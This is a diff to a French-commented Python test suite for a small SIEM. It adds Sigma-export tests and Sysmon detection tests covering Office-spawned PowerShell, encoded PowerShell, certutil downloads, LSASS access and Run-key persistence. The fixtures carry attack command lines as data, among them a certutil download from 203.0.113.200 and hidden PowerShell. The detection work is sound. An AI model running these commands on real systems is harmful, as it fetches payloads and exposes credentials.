@@ -260,11 +260,51 @@ def test_disabled_rule_suppressed():
     assert apply_config(alerts, cfg) == []
 
 
-def test_sigma_export_is_valid_yaml():
+def _sigma(rule_id):
     import yaml as _yaml
-    rule = next(r for r in RULES if r["id"] == "SSH_BRUTEFORCE")
-    doc = _yaml.safe_load(rule_to_sigma(rule))
-    assert doc["id"] == "SSH_BRUTEFORCE" and "detection" in doc and "logsource" in doc
+    rule = next(r for r in RULES if r["id"] == rule_id)
+    return list(_yaml.safe_load_all(rule_to_sigma(rule)))
+
+
+def test_sigma_export_threshold_becomes_correlation():
+    base, corr = _sigma("SSH_BRUTEFORCE")
+    assert base["logsource"] == {"product": "linux", "service": "sshd"}
+    assert "Failed password" in base["detection"]["keywords"]
+    c = corr["correlation"]
+    assert c["type"] == "event_count" and c["rules"] == [base["name"]]
+    assert c["condition"] == {"gte": 10} and c["timespan"] == "5m"
+    assert corr["level"] == "high" and base["level"] == "informational"
+
+
+def test_sigma_export_distinct_becomes_value_count():
+    _, corr = _sigma("PORT_SCAN")
+    c = corr["correlation"]
+    assert c["type"] == "value_count" and c["condition"]["field"] == "DPT"
+
+
+def test_sigma_export_sequence_is_ordered():
+    docs = _sigma("WIN_BRUTEFORCE_SUCCESS")
+    names = {d["name"] for d in docs}
+    final = docs[-1]["correlation"]
+    assert final["type"] == "temporal_ordered" and set(final["rules"]) <= names
+    assert docs[0]["detection"]["selection"] == {"EventID": 4625}
+
+
+def test_sigma_export_ids_are_stable_uuids():
+    import uuid
+    ids = [d["id"] for r in RULES for d in _sigma(r["id"])]
+    assert len(ids) == len(set(ids))
+    assert all(str(uuid.UUID(i)) == i for i in ids)
+    assert ids == [d["id"] for r in RULES for d in _sigma(r["id"])]
+
+
+def test_sigma_export_sysmon_uses_sigma_taxonomy():
+    (doc,) = _sigma("SYSMON_LSASS_ACCESS")
+    assert doc["logsource"] == {"product": "windows", "category": "process_access"}
+    det = doc["detection"]
+    assert det["selection"]["TargetImage|endswith"] == ["\\lsass.exe"]
+    assert "SourceImage|endswith" in det["filter"]
+    assert det["condition"] == "selection and not filter"
 
 
 def test_json_export_roundtrips():
@@ -312,3 +352,148 @@ def test_cti_no_contact_for_clean_ip():
     events = [_ssh(t0, "failure", "192.0.2.1")]  # IP absente du flux
     ti = ThreatIntel()
     assert detect_threat_contacts(ti, events, []) == []
+
+
+# --- V6 : Sysmon (poste de travail Windows) ------------------------------
+
+def _sysmon_xml(eid, data, ts="2026-11-08T14:05:31.1234567Z"):
+    fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
+    return ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+            '<System><Provider Name="Microsoft-Windows-Sysmon" '
+            'Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>'
+            f'<EventID>{eid}</EventID><TimeCreated SystemTime="{ts}"/>'
+            '<Channel>Microsoft-Windows-Sysmon/Operational</Channel>'
+            f'<Computer>PC01</Computer></System><EventData>{fields}</EventData></Event>')
+
+
+WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
+PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+
+def _proc(image, cmd, parent=r"C:\Windows\explorer.exe"):
+    return Event(timestamp=datetime(2026, 11, 8, 14, 5), source="sysmon",
+                 event_type="process_creation", outcome="info", host="PC01", user="mmartin",
+                 process=image, parent_process=parent, command_line=cmd, raw="x")
+
+
+def test_parse_sysmon_process_creation():
+    ev = parse_evtx_xml(_sysmon_xml(1, {
+        "Image": PS, "CommandLine": "powershell.exe -c &quot;Get-Date&quot;",
+        "ParentImage": WORD, "User": r"CORP\mmartin", "IntegrityLevel": "Medium"}))
+    assert ev.source == "sysmon" and ev.event_type == "process_creation"
+    assert ev.process == PS and ev.parent_process == WORD
+    assert ev.command_line == 'powershell.exe -c "Get-Date"'   # entités XML décodées
+    assert ev.user == "mmartin" and ev.host == "PC01"
+    assert ev.timestamp.microsecond == 123456                     # 7 chiffres Windows
+
+
+def test_parse_sysmon_network_and_lsass_access():
+    net = parse_evtx_xml(_sysmon_xml(3, {
+        "Image": r"C:\Windows\System32\rundll32.exe", "SourceIp": "10.0.20.15",
+        "DestinationIp": "203.0.113.200", "DestinationPort": "443"}))
+    assert net.event_type == "network_connection" and net.dest_ip == "203.0.113.200"
+    assert net.dest_port == 443 and net.source_ip == "10.0.20.15"
+    acc = parse_evtx_xml(_sysmon_xml(10, {
+        "SourceImage": r"C:\Temp\x.exe", "TargetImage": r"C:\Windows\system32\lsass.exe",
+        "GrantedAccess": "0x1FFFFF", "SourceUser": r"CORP\mmartin"}))
+    assert acc.event_type == "process_access" and acc.granted_access == "0x1fffff"
+    assert acc.process == r"C:\Temp\x.exe" and acc.user == "mmartin"
+
+
+def test_sysmon_event_id_1_is_not_a_security_event():
+    # EventID 1 hors Sysmon : ignoré (le canal Sécurité n'a pas d'événement 1)
+    xml = _sysmon_xml(1, {"Image": PS}).replace("Sysmon", "Other")
+    assert parse_evtx_xml(xml) is None
+
+
+def test_office_spawning_powershell_triggers():
+    ev = _proc(PS, "powershell.exe -nop -w hidden", parent=WORD)
+    assert "SYSMON_OFFICE_SHELL" in _ids(run_rules(RULES, [ev]))
+
+
+def test_office_printing_child_is_quiet():
+    ev = _proc(r"C:\Windows\splwow64.exe", "splwow64.exe 12288", parent=WORD)
+    assert run_rules(RULES, [ev]) == []
+
+
+def test_encoded_powershell_triggers_on_abbreviations():
+    for flag in ("-enc", "-EncodedCommand", "-ec", "-e", "/enc"):
+        ev = _proc(PS, f"powershell.exe -nop {flag} SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA")
+        assert "SYSMON_PS_ENCODED" in _ids(run_rules(RULES, [ev])), flag
+
+
+def test_admin_script_powershell_is_quiet():
+    ev = _proc(PS, "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inv.ps1",
+               parent=r"C:\Windows\System32\svchost.exe")
+    assert run_rules(RULES, [ev]) == []
+
+
+def test_certutil_download_triggers_but_hashfile_is_quiet():
+    dl = _proc(r"C:\Windows\System32\certutil.exe",
+               "certutil.exe -urlcache -split -f http://203.0.113.200/a C:\\Temp\\a.dll")
+    assert "SYSMON_LOLBIN_DOWNLOAD" in _ids(run_rules(RULES, [dl]))
+    ok = _proc(r"C:\Windows\System32\certutil.exe", "certutil.exe -hashfile setup.msi SHA256")
+    assert run_rules(RULES, [ok]) == []
+
+
+def _lsass(source, access):
+    return Event(timestamp=datetime(2026, 11, 8, 14, 9), source="sysmon",
+                 event_type="process_access", outcome="info", host="PC01",
+                 process=source, target=r"C:\Windows\system32\lsass.exe",
+                 granted_access=access, raw="x")
+
+
+def test_lsass_memory_access_triggers():
+    alerts = run_rules(RULES, [_lsass(r"C:\Windows\System32\rundll32.exe", "0x1010")])
+    assert [a.severity for a in alerts if a.rule_id == "SYSMON_LSASS_ACCESS"] == ["critical"]
+
+
+def test_lsass_access_by_antivirus_is_filtered():
+    av = _lsass(r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe", "0x1410")
+    limited = _lsass(r"C:\Windows\System32\Taskmgr.exe", "0x1000")   # lecture limitée
+    assert run_rules(RULES, [av, limited]) == []
+
+
+def test_run_key_persistence_triggers():
+    ev = Event(timestamp=datetime(2026, 11, 8, 14, 7), source="sysmon",
+               event_type="registry_set", outcome="info", host="PC01",
+               process=r"C:\Windows\System32\rundll32.exe",
+               target=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Upd",
+               raw="x")
+    assert "SYSMON_RUN_KEY" in _ids(run_rules(RULES, [ev]))
+
+
+def test_lolbin_network_and_cti_on_destination():
+    t0 = datetime(2026, 11, 8, 14, 6)
+    events = [Event(timestamp=t0 + timedelta(seconds=60 * i), source="sysmon",
+                    event_type="network_connection", outcome="info", host="PC01",
+                    process=r"C:\Windows\System32\rundll32.exe", source_ip="10.0.20.15",
+                    dest_ip="203.0.113.200", dest_port=443, raw="x") for i in range(5)]
+    alerts = run_rules(RULES, events)
+    net = [a for a in alerts if a.rule_id == "SYSMON_LOLBIN_NETWORK"]
+    assert len(net) == 1 and net[0].count == 5
+    cti = detect_threat_contacts(ThreatIntel(), events, alerts)
+    assert [(a.rule_id, a.source_ip) for a in cti] == [("THREAT_INTEL_HIT", "203.0.113.200")]
+
+
+def test_sysmon_sample_normal_day_is_quiet_attack_is_seen():
+    from minisiem.parsers import parse_file
+    events = list(parse_file(str(Path(__file__).resolve().parent.parent
+                                 / "samples" / "sysmon_events.xml")))
+    normal = [e for e in events if e.timestamp.hour < 14]
+    assert normal and run_rules(RULES, normal) == []
+    seen = _ids(run_rules(RULES, events))
+    assert {"SYSMON_OFFICE_SHELL", "SYSMON_PS_ENCODED", "SYSMON_LOLBIN_DOWNLOAD",
+            "SYSMON_LOLBIN_NETWORK", "SYSMON_RUN_KEY", "SYSMON_LSASS_ACCESS"} <= seen
+
+
+def test_endswith_and_filter_operators():
+    from minisiem.rules import _match_field
+    assert _match_field(r"C:\X\PowerShell.EXE", {"endswith": ["\\powershell.exe"]})
+    assert not _match_field(None, {"endswith": "x"})
+    rule = {"id": "T", "title": "t", "type": "match", "level": "low",
+            "selection": {"event_type": "process_creation"},
+            "filter": {"process": {"endswith": "\\ok.exe"}}, "group_by": ["process"]}
+    kept = _proc(r"C:\bad.exe", "x")
+    dropped = _proc(r"C:\ok.exe", "x")
+    assert [a.count for a in run_rules([rule], [kept, dropped])] == [1]
